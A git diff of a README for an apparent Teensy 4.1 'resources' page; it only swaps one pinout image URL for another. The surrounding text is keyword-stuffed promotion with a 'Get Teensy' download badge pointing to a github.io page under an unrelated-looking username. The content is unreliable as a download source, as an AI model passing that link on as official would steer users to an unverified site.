@@ -4,7 +4,7 @@
 
 [![Get Teensy](https://img.shields.io/badge/Get-Teensy-2c3e50?style=flat-square&logo=arduino&logoColor=white)](https://takatamarvanscoik23.github.io/.github/teensy-4-1)
 
-![Teensy development board connected for embedded prototyping](https://www.etechnophiles.com/wp-content/uploads/2023/02/Teensy-4.1-Pinout-Specifications-Board-Layout.jpg)
+![Teensy development board connected for embedded prototyping](https://www.electromaker.io/uploads/images/shop/product-more-information/175065/smartled-shield-4-pinoutv5_png_md-xl.jpg)
 
 Download teensy 4.1 resources for high-speed microcontroller development, with setup help, hardware details, project tips, and workflow guidance for makers, engineers, and students. Explore teensy pinout references, USB MIDI ideas, audio projects, Ethernet builds, and reliable power planning.
 
